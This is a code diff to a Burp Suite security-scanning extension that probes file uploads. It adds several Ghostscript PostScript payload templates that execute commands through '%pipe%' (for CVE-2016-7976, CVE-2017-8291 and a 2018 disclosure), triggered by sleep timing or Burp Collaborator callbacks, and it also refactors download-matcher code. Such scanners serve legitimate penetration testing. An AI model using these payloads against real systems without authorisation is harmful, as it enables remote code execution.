@@ -313,7 +313,7 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             ('', '.gs', ''),
             ('', '.eps', ''),
             ('', BurpExtender.MARKER_ORIG_EXT, 'text/plain'),
-            # ('', '.gif', 'image/gif'),
+            ('', '.jpeg', 'image/jpeg'),
             ('', '.png', 'image/png'),
         }
 
@@ -972,7 +972,13 @@ class BurpExtender(IBurpExtender, IScannerCheck,
             burp_colab = None
             print "Warning: No Burp Collaborator will be used"
         colab_tests = []
+
+        # We need to make sure that the global download matchers are from now on active for the URL we scan
+        url = FloydsHelpers.u2s(self._helpers.analyzeRequest(injector.get_brr()).getUrl().toString())
+        self.dl_matchers.add_collection(url)
+
         scan_was_stopped = False
+
         try:
             # Sanity/debug check. Simply uploads a white picture called screenshot_white.png
             print "Doing sanity check and uploading a white png file called screenshot_white.png"
@@ -1353,10 +1359,9 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         name = "Ghostscript RCE"
         severity = "High"
         confidence = "Certain"
-        techniques = (("OutputICCProfile", "CVE-2016-7976"), ("OutputFile", "CVE-2017-8291"))
         base_detail = "A ghostscript file with RCE payload was uploaded. See " \
                       "http://www.openwall.com/lists/oss-security/2016/09/30/8 and http://cve.circl.lu/cve/CVE-2017-8291 " \
-                      "for details. "
+                      "and http://openwall.com/lists/oss-security/2018/08/21/2 for details. "
         detail_sleep = "A delay was dectected twice when uploading a ghostscript file with a payload that " \
                        "executes a sleep like command. Therefore arbitrary command execution seems possible. " \
                        "The payload used the {} argument ({}) and the payload {}."
@@ -1364,17 +1369,68 @@ class BurpExtender(IBurpExtender, IScannerCheck,
                        "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. " \
                        "The payload used the {} argument ({}) and the payload {}. Interactions: <br><br>"
         basename = BurpExtender.DOWNLOAD_ME + self.FILE_START + "Gs"
-        content = "%!PS\n" \
-                  "currentdevice null true mark /{} (%pipe%{} {} )\n" \
-                  ".putdeviceparams\n" \
-                  "quit"
+
+        content_original_cve = "%!PS\n" \
+                               "currentdevice null true mark /{} (%pipe%{} {} )\n" \
+                               ".putdeviceparams\n" \
+                               "quit"
+
+        content_2 = "%!PS\n" \
+                    "*legal*\n" \
+                    "*{{ null restore }} stopped {{ pop }} if*\n" \
+                    "*legal*\n" \
+                    "*mark /{} (%pipe%{} {}) currentdevice putdeviceprops*\n" \
+                    "*showpage*"
+
+        content_ubuntu = "%!PS\n" \
+                         "userdict /setpagedevice undef\n" \
+                         "save\n" \
+                         "legal\n" \
+                         "{{ null restore }} stopped {{ pop }} if\n" \
+                         "{{ legal }} stopped {{ pop }} if\n" \
+                         "restore\n" \
+                         "mark /{} (%pipe%{} {}) currentdevice putdeviceprops"
+
+        content_centos = "%!PS\n" \
+                         "userdict /setpagedevice undef\n" \
+                         "legal\n" \
+                         "{{ null restore }} stopped {{ pop }} if\n" \
+                         "legal\n" \
+                         "mark /{} (%pipe%{} {}) currentdevice putdeviceprops"
+
+        techniques = (
+            ("OutputFile", "CVE-2017-8291", content_original_cve),
+            ("OutputICCProfile", "CVE-2016-7976", content_original_cve),
+
+            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_2),
+            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_2),
+
+            # OutputFile worked on a Linux minti 4.8.0-53-generic #56~16.04.1-Ubuntu SMP Tue May 16 01:18:56 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
+            # With "identify" and "convert" from ImageMagick 6.8.9-9 Q16 x86_64 2017-03-14
+            # But OutputICCProfile didn't:
+            #   ./base/gsicc_manage.c:1088: gsicc_open_search(): Could not find %pipe%sleep 6.0
+            # | ./base/gsicc_manage.c:1708: gsicc_set_device_profile(): cannot find device profile
+            #   ./base/gsicc_manage.c:1088: gsicc_open_search(): Could not find %pipe%sleep 6.0
+            # | ./base/gsicc_manage.c:1708: gsicc_set_device_profile(): cannot find device profile
+            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_ubuntu),
+            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_ubuntu),
+
+            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_centos),
+            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_centos),
+        )
 
         # Sleep based
-        for param, cve in techniques:
-            for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
-                details = base_detail + detail_sleep.format(param, cve, cmd)
-                issue = self._create_issue_template(injector.get_brr(), name + " " + cve, details, confidence, severity)
-                sleep_content = content.format(param, cmd, str(injector.opts.sleep_time * factor) + args)
+        for cmd_name, cmd, factor, args in self._get_sleep_commands(injector):
+            for param, reference, content in techniques:
+                details = base_detail + detail_sleep.format(param, reference, cmd)
+                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
+                sleep_content = content.format(
+                    #injector.opts.image_width,
+                    #injector.opts.image_height,
+                    param,
+                    cmd,
+                    str(injector.opts.sleep_time * factor) + args
+                )
                 self._send_sleep_based(injector, basename + cmd_name, sleep_content, self.GS_TYPES, injector.opts.sleep_time, issue)
 
         # Burp community edition doesn't have Burp collaborator
@@ -1383,11 +1439,17 @@ class BurpExtender(IBurpExtender, IScannerCheck,
         colab_tests = []
 
         # Colab based
-        for param, cve in techniques:
-            for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
-                details = base_detail + detail_colab.format(param, cve, cmd)
-                issue = self._create_issue_template(injector.get_brr(), name + " " + cve, details, confidence, severity)
-                attack = content.format(param, cmd, server)
+        for cmd_name, cmd, server, replace in self._get_rce_interaction_commands(injector, burp_colab):
+            for param, reference, content in techniques:
+                details = base_detail + detail_colab.format(param, reference, cmd)
+                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
+                attack = content.format(
+                    #injector.opts.image_width,
+                    #injector.opts.image_height,
+                    param,
+                    cmd,
+                    server
+                )
                 colab_tests.extend(self._send_collaborator(injector, burp_colab, self.GS_TYPES, basename + param + cmd_name,
                                                            attack, issue, replace=replace, redownload=True))
 
@@ -4756,7 +4818,10 @@ class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
                     print "FlexiInjector insertion point found for getInsertionPoint ActiveScan!"
                     injector = fi
             if injector:
-                # First handle the zip files
+                # First the feature that we can detect CSVs
+                insertion_points.extend(self._get_csv_insertion_points(injector))
+
+                # Then handle the zip files
                 bf = BackdooredFile(None, tool=self._global_opts.image_exiftool)
                 upload_type = ('', ".zip", BackdooredFile.EXTENSION_TO_MIME[".zip"])
                 # Achieve bf.get_zip_files(payload_func, techniques=["name"])
@@ -4784,9 +4849,6 @@ class InsertionPointProviderForActiveScan(IScannerInsertionPointProvider):
                             kwargs = {"techniques": [(name, cmd_line_args, [format, ]), ]}
                             function = bf.get_exiftool_images
                             insertion_points.append(InsertionPointForActiveScan(injector, upload_type, function, args, kwargs))
-
-                # Now the feature that we can detect CSVs
-                insertion_points.extend(self._get_csv_insertion_points(injector))
         except:
             self.burp_extender.show_error_popup(traceback.format_exc())
             raise sys.exc_info()[1], None, sys.exc_info()[2]
@@ -6723,15 +6785,20 @@ class DownloadMatcherCollection(object):
         self._thread_lock = threading.Lock()
 
     def add(self, dl_matcher):
+        brr = dl_matcher.issue.get_base_request_response()
+        iRequestInfo = self._helpers.analyzeRequest(brr)
+        url = FloydsHelpers.u2s(iRequestInfo.getUrl().toString())
+        host = self.add_collection(url)
         with self._thread_lock:
-            brr = dl_matcher.issue.get_base_request_response()
-            iRequestInfo = self._helpers.analyzeRequest(brr)
-            url = FloydsHelpers.u2s(iRequestInfo.getUrl().toString())
-            host = self._get_host(url)
-            if host not in self._collection:
-                print "The DownloadMatcherCollection has now passive checks for", host
-                self._collection[host] = set()
             self._collection[host].add(dl_matcher)
+
+    def add_collection(self, url):
+        host = self._get_host(url)
+        with self._thread_lock:
+            if host not in self._collection:
+                print "The DownloadMatcherCollection has now passive checks (at least the global matchers) for", host
+                self._collection[host] = set()
+        return host
 
     def _create_globals(self):
         title = "GraphicsMagick version leakage"
@@ -6780,9 +6847,9 @@ class DownloadMatcherCollection(object):
         return g
 
     def add_scope(self, brr_url, url):
+        brr_host = self._get_host(brr_url)
+        host = self._get_host(url)
         with self._thread_lock:
-            brr_host = self._get_host(brr_url)
-            host = self._get_host(url)
             if host in self._collection:
                 return
             if brr_host not in self._scope_mapping:
@@ -6792,18 +6859,26 @@ class DownloadMatcherCollection(object):
                 self._scope_mapping[brr_host].add(host)
 
     def get_matchers_for_url(self, url):
+        hostport = self._get_host(url)
+        if not hostport:
+            print "Couldn't extract hostport from the url", url
+            return []
         with self._thread_lock:
-            hostport = self._get_host(url)
-            if not hostport:
-                return []
             if hostport in self._collection:
+                # print "Found DownloadMatchers", hostport, "that correspond to", url
                 return self.with_global(self._collection[hostport])
 
-            for name in self._scope_mapping:
-                if hostport in self._scope_mapping[name]:
-                    if name in self._collection:
-                        return self.with_global(self._collection[name])
+            name = self.get_scope(hostport)
+            if name:
+                # print "Found DownloadMatchers for", name, "that can be used for", url
+                return self.with_global(self._collection[name])
         return []
+
+    def get_scope(self, hostport):
+        for name in self._scope_mapping:
+            if hostport in self._scope_mapping[name]:
+                if name in self._collection:
+                    return name
 
     def remove(self, url, matcher):
         with self._thread_lock:
@@ -6811,13 +6886,11 @@ class DownloadMatcherCollection(object):
             if hostport in self._collection:
                 if matcher in self._collection[hostport]:
                     self._collection[hostport].remove(matcher)
-                else:
-                    # Actually no reason to warn. If multithreaded matchers are triggered, then removing could take
-                    # once but the second match for the same matcher is already waiting for the thread lock to remove it
-                    # print "Warning: Couldn't remove DownloadMatcher as matcher not in {}'s collection".format(hostport)
-                    pass
             else:
-                print "Warning: Couldn't remove DownloadMatcher as host:port {} not in {}".format(hostport, self._collection.keys())
+                name = self.get_scope(hostport)
+                if name and name in self._collection:
+                    if matcher in self._collection[name]:
+                        self._collection[name].remove(matcher)
 
     def _get_host(self, url):
         if not url:
@@ -6850,6 +6923,7 @@ class DownloadMatcherCollection(object):
         no_of_matchers = 0
         serialized_collection, self._scope_mapping = serialized_object
         for host in serialized_collection:
+            print "Deserializing DownloadMatchers for", host
             self._collection[host] = set()
             for matcher in serialized_collection[host]:
                 # print "Deserialization", host, type(matcher), repr(matcher)
@@ -7917,7 +7991,7 @@ class OptionsPanel(JPanel, DocumentListener, ActionListener):
                 if bi.exiftool_present():
                     self.image_exiftool = path
                     self.show_exiftool_field = False
-                    print "Found working exiftool by invoking '" + path+"' on the command line"
+                    print "Found working exiftool by invoking '" + path + "' on the command line"
                     break
             else:
                 print "Searched for exiftool but did not find a proper executable..."
